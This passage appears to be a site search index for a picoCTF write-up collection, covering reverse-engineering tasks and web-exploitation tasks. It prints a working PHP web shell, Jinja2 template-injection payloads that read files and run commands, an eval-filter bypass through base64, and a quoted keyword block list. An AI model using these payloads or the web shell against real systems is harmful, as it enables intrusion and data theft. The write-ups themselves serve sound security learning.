<p>Local vs Remote</p> <p>It will be much easier to test your theories locally, then apply them to the <code>netcat</code> service to obtain the actual flag.</p> <p>With the <code>flag.txt</code> file in the same directory, try executing the <code>lyric-reader.py</code> locally. </p> Local execution<pre><code># Make the program executable\nchmod +x lyric-reader.py\n\n# execute the program\npython lyric-reader.py\n</code></pre> <p>Start using various input attempts to inject a command that will redirect execution to the beginning of the song, before VERSE1.  Personally, it took me a while to figure out the correct payload syntax that is needed. I eventually used the debug feature of VS Code to set up breaks in the code and track the values of the different variables. I also commented out line 127 <code>time.sleep(0.5)</code> so as to not have to wait. Eventually, I was able to find the correct payload:</p> Payload<pre><code>;RETURN 0\n</code></pre> <p>The pain-points I ran into was spaces. The semicolon(;) is critical, since the program splits lines on semicolons and process each part separately. However, I found out it is just as critical to have the spacing correct. If there is a space between the semicolon and the start of the return, it will not work.</p> <p>Answer</p> <p>Connect to the service using <code>netcat</code>. When prompted, enter <code>;RETURN 0</code> to view the secret intro. </p>"},{"location":"Reverse%20Engineering/o2/","title":"Binary Instrumentation 1","text":"<p>Difficulty:  Direct link: Executable. Use the password <code>picoctf</code> to unzip</p>"},{"location":"Reverse%20Engineering/o2/#objective","title":"Objective","text":"<p>Description</p> <p>I have been learning to use the Windows API to do cool stuff! Can you wake up my program to get the flag?</p>"},{"location":"Reverse%20Engineering/o2/#hints","title":"Hints","text":"Hint 1 <p>Frida is an easy-to-install, lightweight binary instrumentation toolkit</p> Hint 2 <p>Try using the CLI tools like frida-trace to auto-generate handlers</p>"},{"location":"Reverse%20Engineering/o2/#solution","title":"Solution","text":"<p>This challenge starts by providing a compressed Windows executable, along with hints of to use a tool called <code>frida</code>. According to their website frida is a \"Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.\" It can quickly and easily be installed with <code>pip</code> using <code>pip install frida-tools</code>. Read more about Frida, use cases, and functions from the documentation. I also spun up a reverse engineering specific Windows VM. You can read more about FLARE-VM and install your own from the mandiant GitHub. This write-up will be using PowerShell when executing Frida and the challenge executable.</p> <p>Tools &amp; VMs</p> <p>Just like the use of virtual environments is a good habit to get into; it is well advised to use virtual machines for things like forensics and reverse engineering. There are a number of valid reasons for keeping these machines seperate, and using the right one for the job, not the least of which is isolation. </p> <p>Where ever you choose to do your work, download the .zip file and unzip or extract the file. Then use Frida to execute the <code>bininst1.exe</code> file. From a Windows computer:</p> <pre><code>1.  Open PowerShell\n    1.  Use ++\"Win\"++ + ++\"R\"++ to open \"Run\"\n    2.  type \"powershell\" and press ++\"Enter\"++\n2.  Navigate to the directory that `bininst1.exe` was extracted to\n3.  Initiate `frida-trace` to execute the file\n    1.  `frida-trace -f bininst1.exe`\n</code></pre> <p></p> <p>We don't have that kind of time to be waiting</p> <p>Lets check for any sleep-related function calls in the program. If we find them, we can intercept and modify the calls. Use <code>frida-trace</code> from the command line again, this time using <code>-i</code> to tell <code>frida</code> to include the \"Sleep\" and \"SleepEx\" functions:</p> CLI<pre><code>frida-trace -f bininst1.exe -i \"Sleep\" -i \"SleepEx\"\n</code></pre> <p></p> <p>This shows both functions being used.</p> <p>With the functions known, we can write a <code>hook.js</code> script that Frida can inject into the program as it is executing. In this case, we need to \"hook\" the <code>Sleep</code> and <code>SleepEx</code> functions and modify them. </p> hook.js<pre><code>Interceptor.attach(Module.getExportByName(null, 'Sleep'), {\n    onEnter: function(args) {\n        console.log('[+] Sleep called with: ' + args[0] + ' milliseconds');\n        args[0] = ptr('0'); // Changes sleep time to 0\n        console.log('[+] Modified Sleep duration to: 0 milliseconds');\n    }\n  });\n\n  Interceptor.attach(Module.getExportByName(null, 'SleepEx'), {\n    onEnter: function(args) {\n        console.log('[+] SleepEx called with: ' + args[0] + ' milliseconds');\n        args[0] = ptr('0'); // Changes sleep time to 0\n        console.log('[+] Modified SleepEx duration to: 0 milliseconds');\n    }\n  });\n\n  console.log(\"[+] Sleep hooks installed. Running program with bypassed sleep...\");\n</code></pre> Using `hook.js`<pre><code>frida -f bininst1.exe -l hooks.js\n</code></pre> <p></p> <p>The flage is given in base64, which can be copy and pasted to CyberChef</p> <p>Answer</p> <p>Use the Frida tool to investigate and modify an executable</p>"},{"location":"Reverse%20Engineering/o3/","title":"Tap into Hash","text":"<p>Difficulty:  Direct link: Source file Encrypted file: Download</p>"},{"location":"Reverse%20Engineering/o3/#objective","title":"Objective","text":"<p>Description</p> <p>Can you make sense of this source code file and write a function that will decode the given encrypted file content?</p>"},{"location":"Reverse%20Engineering/o3/#hints","title":"Hints","text":"Hint 1 <p>Do you know what blockchains are? If so, you know that hashing is used in blockchains.</p> Hint 2 <p>Download the encrypted flag file and the source file and reverse engineer the source file.</p>"},{"location":"Reverse%20Engineering/o3/#solution","title":"Solution","text":"<p>Starting off, we are given the encrypted file and source file (see above for downloads). This made \"Hint 2\" seem a bit meaningless. Regardless, download the encrypted flag and source file. Use your preferred IDE or text exitor to open <code>block_chain.py</code> and review it. The <code>enc_flag</code> contains the \"Key\" and \"Encrypted Blockchain\"  If \"Hint 1\" didn't give it away, <code>block_chain.py</code> took the flag and encrypted it within the a blockchain encryption. Breaking it down:     1.  Blockchain Generation:         *   the code creates a blockchain with 5 blocks ( including the genesis block)         *   each block contains encoded transactions (\"Transaction_1\", \"Transaction_2\", etc)         *   the <code>proof_of_work</code> function adds a nonce to each block until its hash starts with \"00\".         *   the blockchain_to_string<code>function concatenates the hashes of all blocks, seperated by hyphens (</code>-<code>)     2.  Encryption         *   the</code>encrypt<code>function takes the</code>blockchain_string<code>and the provided</code>token<code>(the flag in this case) as input         *   it</code>token<code>is inserted in the middle of the</code>blockchain_string<code>*   it then pads the combined string ito a multiple of 16 bytes         *   it uses the</code>random_string` (converted to a byte key) to XOR-encrypt the padded string in 16-byte blocks.</p> <pre><code>graph TD\n    subgraph Blockchain Structure\n        direction LR\n        A[Genesis Block] --&gt; B{Block 1}\n        B --&gt; C{Block 2}\n        C --&gt; D{Block 3}\n        D --&gt; E{Block 4}\n\n        subgraph Block 1\n            direction LR\n            A_idx[Index: 1]\n            A_prev[Previous Hash: Genesis Hash]\n            A_ts[Timestamp]\n            A_tx[Encoded Transactions: ...]\n            A_nonce[Nonce: ...]\n            A_hash[Hash: ...]\n        end\n\n        subgraph Block 2\n            direction LR\n            B_idx[Index: 2]\n            B_prev[Previous Hash: Hash of Block 1]\n            B_ts[Timestamp]\n            B_tx[Encoded Transactions: ...]\n            B_nonce[Nonce: ...]\n            B-hash[Hash: ...]\n        end\n\n        style A fill:#f9f,stroke:#333,stroke-width:2px\n        style B fill:#ccf,stroke:#333,stroke-width:2px\n        style C fill:#ccf,stroke:#333,stroke-width:2px\n        style D fill:#ccf,stroke:#333,stroke-width:2px\n        style E fill:#ccf,stroke:#333,stroke-width:2px\n    end\n\n    subgraph Encryption/Decryption Process\n        direction TB\n        F[Input: Blockchain String] --&gt; G(Insert Token)\n        G --&gt; H(Pad String)\n        H --&gt; I(XOR with Key Hash)\n        I --&gt; J[Encrypted Blockchain]\n\n        K[Input: Encrypted Blockchain] --&gt; L(XOR with Key Hash)\n        L --&gt; M(Unpad String)\n        M --&gt; N(Extract Inner Text - Flag)\n    end\n\n    linkStyle default stroke:#333,stroke-width:2px\n\n    style J fill:#afa,stroke:#333,stroke-width:2px\n    style N fill:#afa,stroke:#333,stroke-width:2px</code></pre> <p>We can reverse this with a python script to extract the flag. It took some tweaking with trial and error, but eventually I was able to use this script:</p> decrypt.py<pre><code>import hashlib\n\ndef decrypt(ciphertext, key):\n    block_size = 16\n    key_hash = hashlib.sha256(key).digest()\n    plaintext = b''\n\n    for i in range(0, len(ciphertext), block_size):\n        block = ciphertext[i:i + block_size]\n        plain_block = xor_bytes(block, key_hash)\n        plaintext += plain_block\n\n    plaintext = unpad(plaintext)\n    return plaintext\n\ndef unpad(data):\n    padding_length = data[-1]\n    if padding_length &gt; len(data):\n        return data\n    return data[:-padding_length]\n\ndef xor_bytes(a, b):\n    return bytes(x ^ y for x, y in zip(a, b))\n\ndef main():\n    random_string = \"5a a3 f6 d4 db 8a 9c 10 84 f8 b6 b0 3a 1c ce ca bf 58 96 9d 87 09 6d d6 be 34 61 c5 d5 91 5e 98\".replace(\" \", \"\")\n    key = bytes.fromhex(random_string)\n    encrypted_blockchain = b'&lt;paste encrypted text&gt;'\n\n    decrypted_blockchain = decrypt(encrypted_blockchain, key).decode()\n    print(\"Decrypted Blockchain:\", decrypted_blockchain)\n\n    #Finding and extracting the flag.\n    flag_start = decrypted_blockchain.find(\"picoCTF{\")\n    if flag_start != -1:\n        flag_end = decrypted_blockchain.find(\"}\", flag_start)\n        if flag_end != -1:\n            flag = decrypted_blockchain[flag_start:flag_end + 1]\n            print(\"Flag:\", flag)\n        else:\n            print(\"Could not find the closing '}' of the flag.\")\n    else:\n        print(\"Could not find the flag prefix 'picoCTF{'.\")\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>Answer</p> <p>Reverse the block chain encryption and decrypt the flag.</p>"},{"location":"WebExploitation/o1/","title":"Cookie Monster Secret Recipe","text":"<p>Difficulty:  Direct link: Secret Recipe Login</p>"},{"location":"WebExploitation/o1/#objective","title":"Objective","text":"<p>Description</p> <p>Cookie Monster has hidden his top-secret cookie recipe somewhere on his website. As an aspiring cookie detective, your mission is to uncover this delectable secret. Can you outsmart Cookie Monster and find the hidden recipe?</p>"},{"location":"WebExploitation/o1/#hints","title":"Hints","text":"Hint 1 <p>Sometimes, the most important information is hidden in plain sight. Have you checked all parts of the webpage?</p> Hint 2 <p>Cookies aren't just for eating - they're also used in web technologies!</p> Hint 3 <p>Web browsers often have tools that can help you inspect various aspects of a webpage, including things you can't see directly.</p>"},{"location":"WebExploitation/o1/#solution","title":"Solution","text":"<p>Start by navigating to the website provided, where we see a login page. </p> <p></p> <p>login page</p> <p>Browser Choice</p> <p>This challenge focuses on the Developer Tools that most browsers have. Different browsers have both different layouts, as well as different tools, although the major points are often universal. I use Chromium in this challenge but any browser should be sufficient, just be aware that the layout may be different.</p> <p>Open up the Developer Tools with F12 or righ-click -&gt; Inspect. </p> <p></p> <p>F12 to inspect Dev Tools</p> <p>Dev Tools will often open in a split screen. Once Developer Tools is open, I tried a basic login with <code>admin:admin</code> to see what results would show up. The first thing is the \"Access Denied\" page. </p> <p></p> <p>Access Denied</p> <p>So logging in isn't the goal, but checking the output in Dev Tools shows us where we need to go next. In Dev Tools, select \"Application\" then highlight cookie labeled \"secret recipe\". </p> <p></p> <p>Highlight the secret recipe to view the cookie</p> <p>The cookie looks to be encoded. Copy and paste it into something like CyberChef to decode it. Grab the cookie, paste it in the input field to decode your flag. </p> <p></p> <p>use a tool like CyberChef to get the flag</p> <p>Answer</p> <p>Use Developer Tools to find the cookie.</p>"},{"location":"WebExploitation/o2/","title":"head-dump","text":"<p>Difficulty:  </p>"},{"location":"WebExploitation/o2/#objective","title":"Objective","text":"<p>Description</p> <p>Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag. The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server\u2019s memory, where a secret flag is hidden.</p>"},{"location":"WebExploitation/o2/#hints","title":"Hints","text":"Hint 1 <p>Explore backend development with us</p> Hint 2 <p>The head was dumped.</p>"},{"location":"WebExploitation/o2/#solution","title":"Solution","text":"<p>To begin the challenge, start the instance and open the link provided. You'll be taken to the blog picoCTF to start exploring. </p> <p></p> <p>Landing page has a few interactive links to click through</p> <p>I started with just poking around, exploring the various links available. Turns out that only the link \"#API Documentation\" is a live link and takes us to the picoCTF News API. </p> <p></p> <p>The last category looks promising based on our clues and challenge title...</p> <p>We are able to expand each of the dropdown arrouws to view the parameter involved, and test out the function. Doing so produces a response with multiple ways of collecting the information provided. You can poke around getting a feel for the endpoint, as well as download the responses provided.</p> <p></p> <p>After using the Try it out Execute button use one of the provided methods to collect the output. A <code>curl</code> command, a request URL, and a Download button are avaialable.</p> <p>At the bottom of the options we find <code>/heapdump</code> which produces a <code>.heapdump</code> file. Download the file using one of the methods listed. </p> <p></p> <p>Download the <code>.heapsnapshot</code> file after executing.</p> <p>With the file downloaded, use Linux Fu to extract your flag.</p> Heapdump flag extraction<pre><code>strings heapdump.heapsnapshot |grep \"picoCTF{\"\n</code></pre> <p>Answer</p> <p>Download the heapdump and extract the flag with Linux commands.</p>"},{"location":"WebExploitation/o3/","title":"n0s4n1ty 1","text":"<p>Difficulty: </p>"},{"location":"WebExploitation/o3/#objective","title":"Objective","text":"<p>Request</p> <p>A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.</p>"},{"location":"WebExploitation/o3/#hints","title":"Hints","text":"Hint 1 <p>File upload was not sanitized</p> Insert Hint 2 Title <p>Whenever you get a shell on a remote machine, check <code>sudo -l</code></p>"},{"location":"WebExploitation/o3/#solution","title":"Solution","text":"<p>The description and hints for this challenge do a lot of the leg work for us. First off, we are told that the website has a flawed upload functionality. Our first hint further confirms our attack vector by advising that the file upload is not sanitized (not sanitized ); and finally the last hint suggest that a shell will be used.  User input is always a good target for web vulnerabilities, whether that is a command injection, a reverse shell oportunity, or as is the case for this challenge, a webshell. Whenever a payload for a web exploit is needed, my go to has been PayloadsAllTheThings on GitHub. Lots of great information, including links to dive deeper or practice concepts, is available on the repo. Looking through the list of options, there is a directory named \"Upload Insecure Files\" with some promising information.  Now lets launch the instance provided and see what we are working with.</p> <p></p> <p>Basic upload page that allows us to search our own machine for a file to upload</p> <p>Our hint states that file upload is not sanitized, however that isn't the same as saying that we can upload any file. I begin by exploring expected behaviour of the site. To do so, I uploaded a small image to view the results. </p> <p></p> <p>uploading <code>favicon.ico</code> successfully, we learn a couple of things.</p> <p>From the successful upload we can learn a few things:     1.  The website is using .php. This provies insight to the type of payload we need to craft     2.  The file path where the image is accessible at</p> <p>Using the provided file path, lets see if the upload is accessible. </p> <p></p> <p>Enter the provided path into the browser navigation to view the uploaded file.</p> <p>Now that we know where file uploads are stored we can try uploading a payload. Using PayloadsAllTheThings it is possible to find PHP specific payloads to upload. </p> shell.php<pre><code>&lt;?php\n// A simple web shell\nif (isset($_GET['cmd'])) {\n    echo \"&lt;pre&gt;\" . shell_exec($_GET['cmd']) . \"&lt;/pre&gt;\";\n}\n?&gt;\n</code></pre> <p>Save the snippet as <code>shell.php</code> then upload it on the website. </p> <p></p> <p>Upload the payload, then copy the path. </p> <p>With our shell uploaded, navigate to the file path. In my example, the file path is <code>uploads/shell.php</code>. </p> <p></p> <p>Navigate to the shell page like the test image. There should be nothing on the page.</p> <p>Display</p> <p>Don't get lost seeing a blank page the first time. Untill there is a command or output to display, you shouldn't see anything. With a webshell we aren't expecting a terminal output, or any listeners. Instead, we will use the navigation bar, combined with <code>?cmd=</code>, to navigate the file system. </p> <p>Now we can use our Linux Fu and the hint from the earlier about checking <code>sudo</code>. In the browser navigation enter <code>?cmd=</code>; This will be our command prompt entry point. The first command I used was the one from the hint: <code>sudo -l</code>. The browser will naturally use URL encoding, changing the blank space to <code>%20</code>. If the shell script and upload worked, it should produce the terminal output on the browser page.</p> <p></p> <p><code>sudo -l</code></p> <p>It worked! The payload was delivered and we now have a webshell. Not only did we end up with a webshell but it appears that the profile that we have access to has <code>sudo</code> rights but no password, meaning we will be able to execute sudo commands without a password.</p> <p>What does it do?</p> <p>Using the <code>man sudo</code> command from a terminal can tell us what the command is expected to do.  <pre><code>-l, --list\n    If  no  command  is  specified, list the privileges for the invoking user (or the\n    user specified by the -U option) on the current host.  A longer  list  format  is\n    used  if this option is specified multiple times and the security policy supports\n    a verbose output format.\n\n    If a command is specified and is permitted by the security policy for the  invok\u2010\n    ing  user  (or  the,  user  specified  by the -U option) on the current host, the\n    fully-qualified path to the command is displayed along with any args.  If  -l  is\n    specified more than once (and the security policy supports it), the matching rule\n    is  displayed in a verbose format along with the command.  If a command is speci\u2010\n    fied but not allowed by the policy, sudo will exit with a status value of 1.\n</code></pre></p> <p>The challenge told us that our flag is going to be located in <code>/root</code> directory and since we found out that we already have the permissions, we can read our flag with <code>sudo cat /root/flag.txt</code>.</p> <p></p> <p>Success!</p> <p>Answer</p> <p>Take advantage of unsanitized input to upload a shell script and read the secure flag.</p>"},{"location":"WebExploitation/o4/","title":"SSTI 1","text":"<p>Difficulty: </p>"},{"location":"WebExploitation/o4/#objective","title":"Objective","text":"<p>Request</p> <p>I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website </p>"},{"location":"WebExploitation/o4/#hints","title":"Hints","text":"Hint 1 <p>Server Side Template Injection</p>"},{"location":"WebExploitation/o4/#solution","title":"Solution","text":"<p>This challenge gave us the attack vector in the hint: \"Server Side Template Injection\". Looking once again at PayloadsAllTheThings there is a Server Side Template Injection directory. One of the really helpful aspects of this resource is the break down offered for many of the vulnerabilities. Under Server Side Template Injection I read up about the methodology for Server Side Template Injection. Typically, it would be necessary to first search for and identify the vulnerable input field(s) but for this challenge there is just the one option when we navigate to the provided instance.</p> <p></p> <p>With only one input field, it is only a matter of crafting the appropriate payload.</p> <p>With the vulnerability and target input field already provided, the next step is to enumerate the template engine used by the server. There are a few different ways that this can be done, once an attacker has determined that a site is vulnerable. The Hackmanit/Template Injection Table has an interactive table containing helpful template injection polyglots along with the expected responses of some of the most used template engines.  In order to enumerate the template engine, we send various polyglots to review the response through the identified attack field. This can be done manually, through the field on the site, or with the use of a tool such as BurpSuite Community. The chart below shows the initial enumeration path I took to get an idea of the framework being used.</p> <pre><code>graph TD\n    A(\"Test payload ${7*7}\") --&gt;|Submit Payload| B(\"Returns 49\")\n    B --&gt;|Yes| C(\"Test next payload: a{\\*comment\\*}b\")\n    B --&gt;|No| D(\"Test next payload: {{7*7}}\")\n    D --&gt;|Returns 49| E(\"Test next payload: {{7*'7'}}\")\n    D --&gt;|Returns input| F[Not Vulnerable]\n    E --&gt;|Returns 7777777| G(possible Jinja2 Template Engine)\n    E --&gt;|Returns 7777777| H(possible Twig Template Engine)\n    E --&gt;|Returns input| I(unknown Template Engine)\n    style F fill:#f00\n    style G stroke:#0f0\n    style H stroke:#0f0\n    style I stroke:#f96</code></pre> <p></p> <p>Manual testing the input field</p> <p></p> <p>test result</p> <p></p> <p>7777777</p> <p>Once the template engine is determined, we can return to PayloadsAllTheThings and the Server Side Template Injection folder to find a list of payloads that can be used for the various payloads. I determined that the template engine being used is Jinja2 which uses the Python language. Checking the available payloads, there's a promising heading <code>Jinja2 - Read Remote File</code>. </p> <p></p> <p>Read Remote File payloads</p> <p>Making adjustments for possible flag locations, I used BurpSuite Intruder to test various payloads.</p> Potential SSTI Payloads<pre><code># ''.__class__.__mro__[2].__subclasses__()[40] = File class\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('flag').read() }}\n{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"flag\").read() }}\n# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398\n{{ get_flashed_messages.__globals__.__builtins__.open(\"flag\").read() }}\n</code></pre> <p></p> <p>Use BurpSuite to send the payload to read the flag</p> <p>Answer</p> <p>Find the right payload to recover the flag. <code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}</code></p>"},{"location":"WebExploitation/o5/","title":"SSTI2","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"WebExploitation/o5/#objective","title":"Objective","text":"<p>Request</p> <p>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem  I heard templating is a cool and modular way to build web apps! Check out my website </p>"},{"location":"WebExploitation/o5/#hints","title":"Hints","text":"Hint 1 <p>Server Side Template Injection</p> Insert Hint 2 Title <p>Why is blacklisting characters a bad idea to sanitize input?</p>"},{"location":"WebExploitation/o5/#solution","title":"Solution","text":"<p>This challange is the same in regard to the technology used and attack surface as SSTI 1 challenge. We have the same input field, but as the creator of the challenge has warned us, our simple attacks from earlier will no longer work.</p> <p> </p> <p>Stop trying to break me &gt;: (</p> <p>Because the characters we need to make this work seem to be blacklisted, we will have to find ways around that. This highlights one of the primary flaws with 'blacklisting'; there are often bypass techniques that are easy to find. Going back to PayloadsAllTheThings I was able to find payloads meant to bypass various filters within the same page that we found the payload for SSTI 1. Using Intruder in BurpSuite Community, I copied each of the payloads to test for the one that returned the appropriate response. Once that was determined, I adjusted the payload to contain <code>cat flag</code> as the executed command, coppied the payload to Repeater in BurpSuite, and now we have our next flag! </p> <p>Answer</p> <p>Using tools such as BurpSuite Community and PayloadsAllTheThings, by pass the input filters to retrieve tha flag.</p>"},{"location":"WebExploitation/o6/","title":"Insert Objective 4 Title","text":"<p>Difficulty:  Direct link: Objective 4 website</p>"},{"location":"WebExploitation/o6/#objective","title":"Objective","text":"<p>Description</p> <p>ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?</p>"},{"location":"WebExploitation/o6/#hints","title":"Hints","text":"Hint 1 <p>Bypass regex</p> Hint 2 <p>The flag file is /flag.txt</p> Hint 3 <p>You might need encoding or dynamic construction to bypass restrictions.</p>"},{"location":"WebExploitation/o6/#solution","title":"Solution","text":"<p>Starting our instance, we see exactly what the description stated; a loan calculator. </p> <p></p> <p>Begin the instance and navigate to the site</p> <p>With the instance running, I began exploring with DevTools, which gives us another clue. </p> <p></p> <p>DevTools gives us a peek at the source code, where the Developer's notes are still visible.</p> <p>Inspecting the page, there is a \"TODO\" list from the developer with notes that give us further insights. </p> Developer Notes<pre><code>&lt;!--\n    TODO\n    ------------\n    Secure python_flask eval execution by\n        1.blocking malicious keyword like os,eval,exev,bind,connec,python,socket,ls,cat,shell,bind\n        2. Implementing regex: r'0x[0-9A-Fa-f]+|\\\\u(0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\\.[A-Za-z0-9]{1,3}\\b| [\\\\\\/]|\\.\\.'\n--&gt;\n</code></pre> <p>This tells us what the constraints of the input sanitization are and that the website is suing python flask. Breaking down the notes above, we know the following: 1. Specific Blocked Keywords</p> <pre><code>* `os`\n* `eval`\n* `exev`\n* `bind`\n* `connec`\n* `python`\n* `socket`\n* `ls`\n* `cat`\n* `shell`\n* `bind`\n</code></pre> <ol> <li> <p>Blocked RegEx Patterns</p> <ul> <li> <p><code>0x[0-9A-Fa-f]+</code>:</p> <ul> <li>matches hexadecimal numbers (e.g., 0xFF, 0x1234)</li> <li><code>0x</code> literally matches the charactes \"0x\" that is the start of hex representation.</li> <li><code>[0-9A-Fa-f]+</code> matches one or more hedadecimal digits (0-9, A-F, or a-f).</li> </ul> </li> <li> <p><code>\\\\u[0-9A-Fa-f]{4}</code>:</p> <ul> <li>matches Unicode escape sequences (e.g., \\u0041).</li> <li><code>\\\\u</code> literally matches the characters \"\\u\".</li> <li><code>[0-9A-Fa-f]{4}</code> matches exactly four hexadecimal digits.</li> </ul> </li> <li> <p><code>%[0-9A-Fa-f]{2}</code>:</p> <ul> <li>mathces URL-encoded characters (e.g., %20)</li> <li><code>%</code> literally matches the percent sign</li> <li><code>[0-9A-Fa-f]{2}</code> matches exactly two hexadecimal digits. </li> </ul> </li> <li> <p><code>\\.[A-Za-z0-9]{1,3}\\b</code>:</p> <ul> <li>matches file extensions (e.g., .txt, .jpg)</li> <li><code>\\.</code> matches a literal dot (.). </li> <li><code>[A-Za-z0-9]{1,3}</code> matches one to three alphanumeric characters</li> <li><code>\\b</code> matches a word boundary, ensuring that the extension is a complete word and not part of a larger word.</li> </ul> </li> <li> <p><code>[\\\\\\/]</code>:</p> <ul> <li>matches either a backslash(<code>\\</code>) or a forward slash (<code>/</code>).</li> </ul> </li> <li> <p><code>\\.\\.</code>:</p> <ul> <li>matches two consecutive dots (..).</li> </ul> </li> </ul> </li> </ol> <p>With these restrictions in place, it was much more difficult to find the correct payload. I spent some time attempting various payloads. Instead of using Intruder this time, I copy and pasted the payloads into BurpSuite Repeater to try narrowing down possible attack paths.   In order to enumerate better, I printed the available subclasses to find a usefull one to exploit.</p> Subclass enumeration<pre><code>[i for i, x in enumerate(''.__class__.__mro__[-1].__subclasses__())]\n</code></pre> <p></p> <p>Now to put names to numbers...</p> <p>I used <code>python!# [x.__name__ for x in ''.__class__.__mro__[-1].__subclasses__()]</code> to get the names of the subclasses to find one that might be useful.</p> <p></p> <p>I fed this list into a LLM to filter for potentially useful subclasses</p> <p>Eventually, I landed on base64 encoding after a few other variations. </p> test payload<pre><code>__import__('base64').b64decode('L2ZsYWcudHh0').decode('utf-8')\n</code></pre> <p>This payload returned <code>/flag.txt</code>. With that confirmation, I was able to craft the payload to read the flag. </p> <p></p> <p>Answer</p> <p><code>python!# open(__import__('base64').b64decode('L2ZsYWcudHh0').decode('utf-8')).read()</code></p>"},{"location":"WebExploitation/o6/#response","title":"Response","text":"<p>Insert Character Name</p> <p>Copy the final part of the conversation.</p>"}]}